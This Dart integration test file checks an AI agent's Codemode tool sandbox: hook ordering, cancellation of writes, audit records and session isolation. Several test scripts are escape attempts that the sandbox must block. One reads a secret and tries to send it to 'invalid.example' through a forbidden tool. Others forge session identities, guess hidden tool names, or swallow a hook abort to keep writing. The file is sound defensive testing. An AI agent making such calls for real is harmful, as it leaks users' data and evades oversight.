// 职责: 在真实 FJS 与 Agent 工具流水线验证九工具编排、拒绝审计和写入取消事实。
// 子调用经 Agent.runToolCall 走同一条 hooks 管线，但不进入 Agent 事件流。
// 关联文件:
//   lib/shared/services/ai/codemode/orchestrator.dart
//   lib/shared/services/ai/codemode/runtime.dart
//   lib/shared/agent/agent.dart
//   lib/shared/models/ai_nested_tool_call.dart
import 'dart:async';
import 'dart:io';

import 'package:flutter/foundation.dart' show debugPrintSynchronously;
import 'package:flutter_test/flutter_test.dart';
import 'package:integration_test/integration_test.dart';
import 'package:reveric/shared/agent/agent.dart';
import 'package:reveric/shared/agent/agent_config.dart';
import 'package:reveric/shared/agent/agent_context_manager.dart';
import 'package:reveric/shared/agent/agent_event.dart';
import 'package:reveric/shared/agent/agent_hook.dart';
import 'package:reveric/shared/agent/agent_tool_dispatcher.dart';
import 'package:reveric/shared/agent/fake_agent.dart';
import 'package:reveric/shared/agent/message.dart';
import 'package:reveric/shared/models/ai_nested_tool_call.dart';
import 'package:reveric/shared/models/ai_run_failure.dart';
import 'package:reveric/shared/services/ai/codemode/orchestrator.dart';
import 'package:reveric/shared/services/ai/codemode/runtime.dart';
import 'package:reveric/shared/services/ai/codemode/scheduler.dart';
import 'package:reveric/shared/services/ai/codemode/tool.dart';

const _excluded = [
  'WebSearch',
  'WebFetch',
  'SpawnAgent',
  'SendAgentMessage',
  'StopAgent',
  'ForkAgent',
  'SuggestNextAction',
  'AskUser',
  'TodoWrite',
  'AgentSkill',
  'Codemode',
];

class _Hook extends AgentHook {
  final calls = <String>[];
  @override
  HookAction<AfterToolCallContext> afterToolCall(AfterToolCallContext context) {
    calls.add(context.call.toolName);
    return const HookAction.proceed();
  }
}

class _AbortReadHook extends AgentHook {
  @override
  HookAction<BeforeToolCallContext> beforeToolCall(
    BeforeToolCallContext context,
  ) => context.call.toolName == 'Read'
      ? HookAction.abort(AiRunFailure.requestFailed())
      : const HookAction.proceed();
}

class _Tools implements AgentToolDispatcher {
  _Tools(this.scheduler);
  final CodemodeScheduler scheduler;
  CodemodeRuntimeLimits limits = const CodemodeRuntimeLimits();
  Future<Map<String, dynamic>> Function(String, Map<String, dynamic>)? handler;
  final calls = <String>[];
  final contexts = <ToolExecutionContext>[];
  final records = <String, Map<String, AiNestedToolCall>>{};
  final agents = <String, Agent>{};
  int active = 0;
  int maximumActive = 0;
  bool allowed = true;

  @override
  Future<Map<String, dynamic>> executeTool({
    required String name,
    required Map<String, dynamic> input,
    String? callId,
    bool emitEvents = true,
    ToolExecutionContext? context,
  }) async {
    if (name == 'Codemode') {
      final parentRecords = records[callId!] = {};
      return CodemodeOrchestrator().execute(
        input: input,
        context: context!,
        parentToolCallId: callId,
        tools: this,
        runTool: (call, context) =>
            agents[callId]!.runToolCall(call, context: context),
        onRecord: (record) => parentRecords[record.callId] = record,
        scheduler: scheduler,
        isAllowed: () => allowed,
        allowedToolNames: allToolNames,
        limits: limits,
      );
    }
    calls.add(name);
    contexts.add(context!);
    context.lifecycleObserver?.onStarted?.call({
      'targetPath': input['path'] ?? 'profile',
    });
    active++;
    if (active > maximumActive) {
      maximumActive = active;
    }
    try {
      final result = handler != null
          ? await handler!(name, input)
          : {
              'ok': true,
              'path': input['path'] ?? 'profile',
              if (codemodeWriteToolNames.contains(name)) 'updated': true,
              if (codemodeWriteToolNames.contains(name)) 'id': 'real-resource',
              if (!codemodeWriteToolNames.contains(name))
                'content': 'PRIVATE_INTERMEDIATE',
            };
      context.lifecycleObserver?.onFinished?.call(result, null);
      return result;
    } catch (error) {
      context.lifecycleObserver?.onFinished?.call(null, error.toString());
      rethrow;
    } finally {
      active--;
    }
  }

  @override
  List<String> allToolNames() => [...codemodeToolNames, ..._excluded];
  @override
  List<ToolDef> allToolDefs() => [
    for (final name in allToolNames())
      ToolDef(
        name: name,
        description: name,
        inputSchema: const {'type': 'object'},
      ),
  ];
  @override
  List<ToolDef> toolDefsForNames(List<String> names) =>
      allToolDefs().where((tool) => names.contains(tool.name)).toList();
}

class _Run {
  _Run(
    String source,
    this.tools, {
    String sessionId = 'session',
    List<AgentHook> extraHooks = const [],
  }) : parentCallId = 'parent-$sessionId' {
    agent = Agent.custom(
      id: sessionId,
      systemPrompt: 'Test',
      config: const AgentConfig(),
      hooks: [hook, ...extraHooks],
      toolManager: tools,
      contextManager: history,
      client: FakeProviderClient(
        responses: [
          FakeProviderClientResponse.toolCalls([
            ToolCall(
              callId: parentCallId,
              toolName: 'Codemode',
              arguments: {'code': source},
            ),
          ]),
          const FakeProviderClientResponse.text('done'),
        ],
      ),
    );
    tools.agents[parentCallId] = agent;
    done = agent
        .process(
          'run',
          toolExecutionContext: ToolExecutionContext(
            sessionId: sessionId,
            sourceSessionId: sessionId,
            sourceTurnId: 'turn-$sessionId',
          ),
        )
        .listen(events.add)
        .asFuture<void>();
  }
  final _Tools tools;
  final String parentCallId;
  final _Hook hook = _Hook();
  final SimpleAgentContextManager history = SimpleAgentContextManager();
  final events = <AgentEvent>[];
  late Agent agent;
  late Future<void> done;
  // 取消时 Codemode 结果随 AgentToolSkipped 带出。
  Map<String, dynamic> get result {
    final completed = events.whereType<AgentToolCallResult>();
    if (completed.isNotEmpty) {
      return completed.single.output as Map<String, dynamic>;
    }
    return events.whereType<AgentToolSkipped>().single.output!;
  }

  List<AiNestedToolCall> get records =>
      tools.records[parentCallId]!.values.toList();
}

void main() {
  IntegrationTestWidgetsFlutterBinding.ensureInitialized();
  testWidgets('profile retained child previews', (tester) async {
    await tester.runAsync(() async {
      for (final count in [100, 400]) {
        final scheduler = CodemodeScheduler(maxActive: 1);
        final tools = _Tools(scheduler);
        final body = 'x' * (64 * 1024);
        tools.handler = (_, _) async => {'ok': true, 'content': body};
        final before = ProcessInfo.currentRss;
        final run = _Run(
          'for(let i=0;i<$count;i++) await tools.Read({path:"materials/fixture"}); return $count;',
          tools,
        );
        await run.done;
        final retained = run.records.fold<int>(
          0,
          (sum, record) =>
              sum +
              record.resultPreview.length +
              record.argumentsPreview.length,
        );
        debugPrintSynchronously(
          'PREVIEW_PROFILE calls=$count retained_chars=$retained rss_before=$before rss_after=${ProcessInfo.currentRss}',
        );
        expect(run.result['completed_count'], count);
        scheduler.dispose();
      }
    });
  });
  testWidgets(
    'ten tools use one serial hook path and only parent output reaches history',
    (tester) async {
      await tester.runAsync(() async {
        final scheduler = CodemodeScheduler(maxActive: 2);
        final tools = _Tools(scheduler);
        final run = _Run('''
const names = ['Read', 'Glob', 'Grep', 'GraphSearch', 'Run', 'Create', 'Write', 'Edit', 'Replace', 'Remove'];
await Promise.all(names.map(name => tools[name]({path:'profile'})));
text(names); return 'summary';
''', tools);
        await run.done;
        expect(tools.calls.toSet(), codemodeToolNames);
        expect(tools.maximumActive, 1);
        expect(run.hook.calls.length, 11);
        expect(run.records.length, 10);
        expect(run.result['completed_operations'], hasLength(5));
        expect(run.result['completed_count'], 10);
        final history = run.history.messages
            .expand((message) => message.blocks)
            .whereType<ToolResultBlock>()
            .toList();
        expect(history.length, 1);
        expect(
          (history.single.content.single as TextBlock).text,
          isNot(contains('PRIVATE_INTERMEDIATE')),
        );
        expect(scheduler.activeCount, 0);
        scheduler.dispose();
      });
    },
  );

  testWidgets(
    'forbidden tools and raw identity spoofing have audit records and no side effects',
    (tester) async {
      await tester.runAsync(() async {
        for (final name in _excluded) {
          final scheduler = CodemodeScheduler(maxActive: 1);
          final tools = _Tools(scheduler);
          final run = _Run('''
const secret = await tools.Read({path:'profile'});
await fjs.bridge_call(JSON.stringify({kind:'tool',tool:'$name',input:JSON.stringify({url:'https://invalid.example/'+secret.content})}));
''', tools);
          await run.done;
          expect(tools.calls, ['Read'], reason: name);
          expect(
            run.result['error_code'],
            'codemode_tool_forbidden',
            reason: name,
          );
          expect(run.records.last.toolName, name);
          expect(run.records.last.status, AiNestedToolStatus.rejected);
          scheduler.dispose();
        }
        final scheduler = CodemodeScheduler(maxActive: 1);
        final tools = _Tools(scheduler);
        final run = _Run(
          'await fjs.bridge_call(JSON.stringify({kind:"tool",tool:"Write",input:"{}",sessionId:"other"}));',
          tools,
        );
        await run.done;
        expect(tools.calls, isEmpty);
        expect(run.result['error_code'], 'codemode_tool_forbidden');
        expect(run.records.single.status, AiNestedToolStatus.rejected);
        scheduler.dispose();
      });
    },
  );

  testWidgets(
    'output failure retains writes',
    (tester) async {
      await tester.runAsync(() async {
        final scheduler = CodemodeScheduler(maxActive: 1);
        final tools = _Tools(scheduler);
        tools.limits = const CodemodeRuntimeLimits(outputBytes: 8);
        final overflow = _Run(
          'await tools.Write({path:"profile"}); text("too much output");',
          tools,
        );
        await overflow.done;
        expect(overflow.result['error_code'], 'codemode_resource_limit');
        final diagnostics = overflow.result['diagnostics'] as Map;
        expect(diagnostics['phase'], 'finished');
        expect(diagnostics['failure_stage'], 'output');
        expect(diagnostics['failure_reason'], 'output_bytes');
        expect(diagnostics['limit'], 8);
        expect(diagnostics['observed'], 17);
        expect(diagnostics['last_tool'], 'Write');
        expect(overflow.result['completed_operations'], hasLength(1));
        expect(
          (overflow.result['completed_operations'] as List)
              .single['resource_id'],
          'real-resource',
        );
        scheduler.dispose();
      });
    },
  );

  testWidgets(
    'cancel after commit waits for write return and keeps confirmed operation',
    (tester) async {
      await tester.runAsync(() async {
        final scheduler = CodemodeScheduler(maxActive: 1);
        final tools = _Tools(scheduler);
        final committed = Completer<void>();
        final release = Completer<void>();
        tools.handler = (_, _) async {
          committed.complete();
          await release.future;
          return {
            'ok': true,
            'updated': true,
            'id': 'actual',
            'path': 'profile',
          };
        };
        final run = _Run(
          'await tools.Write({path:"profile"}); await tools.Create({path:"characters"});',
          tools,
        );
        var finished = false;
        run.done.then((_) {
          finished = true;
        });
        await committed.future;
        run.agent.cancel();
        await Future<void>.delayed(const Duration(milliseconds: 30));
        expect(finished, isFalse);
        release.complete();
        await run.done.timeout(const Duration(seconds: 2));
        expect(tools.calls, ['Write']);
        expect(run.result['cancelled'], isTrue);
        expect(run.result['completed_operations'], hasLength(1));
        expect(run.records.single.effectStatus, AiToolEffectStatus.confirmed);
        expect(run.records.single.status, AiNestedToolStatus.success);
        scheduler.dispose();
      });
    },
  );

  testWidgets(
    'partial write failure is unknown and cancelled reads cannot publish late results',
    (tester) async {
      await tester.runAsync(() async {
        final scheduler = CodemodeScheduler(maxActive: 1);
        final tools = _Tools(scheduler);
        tools.handler = (_, _) async {
          throw StateError('PRIVATE_FAILURE');
        };
        final failed = _Run('await tools.Edit({path:"profile"});', tools);
        await failed.done;
        expect(failed.result['uncertain_operations'], hasLength(1));
        expect(failed.records.single.effectStatus, AiToolEffectStatus.unknown);
        expect(failed.result.toString(), isNot(contains('PRIVATE_FAILURE')));
        final entered = Completer<void>();
        final release = Completer<void>();
        tools.handler = (_, _) async {
          entered.complete();
          await release.future;
          return {'ok': true, 'content': 'late'};
        };
        final read = _Run('await tools.Read({path:"profile"});', tools);
        await entered.future;
        read.agent.cancel();
        await read.done.timeout(const Duration(seconds: 2));
        final count = read.events.length;
        release.complete();
        await Future<void>.delayed(const Duration(milliseconds: 20));
        expect(read.events.length, count);
        // 被取消抢先返回的 Read 在真正结束时仍经过 afterToolCall。
        expect(read.hook.calls, unorderedEquals(['Read', 'Codemode']));
        expect(scheduler.activeCount, 0);
        scheduler.dispose();
      });
    },
  );
  testWidgets(
    'concurrent sessions keep source identity and script results isolated',
    (tester) async {
      await tester.runAsync(() async {
        final scheduler = CodemodeScheduler(maxActive: 2);
        final tools = _Tools(scheduler);
        tools.handler = (_, input) async {
          await Future<void>.delayed(const Duration(milliseconds: 20));
          return {'ok': true, 'label': input['label']};
        };
        final one = _Run(
          'return (await tools.Read({label:"one",sessionId:"forged"})).label;',
          tools,
          sessionId: 'one',
        );
        final two = _Run(
          'return (await tools.Read({label:"two",sessionId:"forged"})).label;',
          tools,
          sessionId: 'two',
        );
        await Future.wait([one.done, two.done]);
        expect(one.result['return_value'], 'one');
        expect(two.result['return_value'], 'two');
        expect(
          tools.contexts.map((context) => context.sourceSessionId).toSet(),
          {'one', 'two'},
        );
        expect(tools.contexts.map((context) => context.sourceTurnId).toSet(), {
          'turn-one',
          'turn-two',
        });
        scheduler.dispose();
      });
    },
  );

  testWidgets('script cannot catch a hook abort and continue writing', (
    tester,
  ) async {
    await tester.runAsync(() async {
      final scheduler = CodemodeScheduler(maxActive: 1);
      final tools = _Tools(scheduler);
      final run = _Run(
        'try { await tools.Read({}); } catch (_) {} await tools.Write({});',
        tools,
        extraHooks: [_AbortReadHook()],
      );
      await run.done;
      expect(tools.calls, isEmpty);
      expect(run.result['error_code'], 'codemode_runtime_failed');
      expect(run.events.whereType<AgentDone>(), hasLength(1));
      expect(scheduler.activeCount, 0);
      scheduler.dispose();
    });
  });
  testWidgets('guessed tool properties are rejected by the host and audited', (
    tester,
  ) async {
    await tester.runAsync(() async {
      for (final name in _excluded) {
        final scheduler = CodemodeScheduler(maxActive: 1);
        final tools = _Tools(scheduler);
        final run = _Run('await tools["$name"]({});', tools);
        await run.done;
        expect(tools.calls, isEmpty);
        expect(
          run.result['error_code'],
          'codemode_tool_forbidden',
          reason: name,
        );
        expect(run.records.single.toolName, name);
        scheduler.dispose();
      }
    });
  });

  testWidgets(
    'unawaited queued writes stop while an already entered write settles',
    (tester) async {
      await tester.runAsync(() async {
        final scheduler = CodemodeScheduler(maxActive: 1);
        final tools = _Tools(scheduler);
        final entered = Completer<void>();
        final release = Completer<void>();
        tools.handler = (_, _) async {
          entered.complete();
          await release.future;
          return {'ok': true, 'updated': true, 'id': 'actual'};
        };
        final run = _Run(
          'tools.Write({path:"profile"}); tools.Create({path:"characters"}); text("queued"); return 1;',
          tools,
        );
        await entered.future;
        await Future<void>.delayed(const Duration(milliseconds: 30));
        release.complete();
        await run.done;
        expect(tools.calls, ['Write']);
        expect(run.result['completed_operations'], hasLength(1));
        expect(run.records.last.status, AiNestedToolStatus.cancelled);
        expect(scheduler.activeCount, 0);
        scheduler.dispose();
      });
    },
  );
}
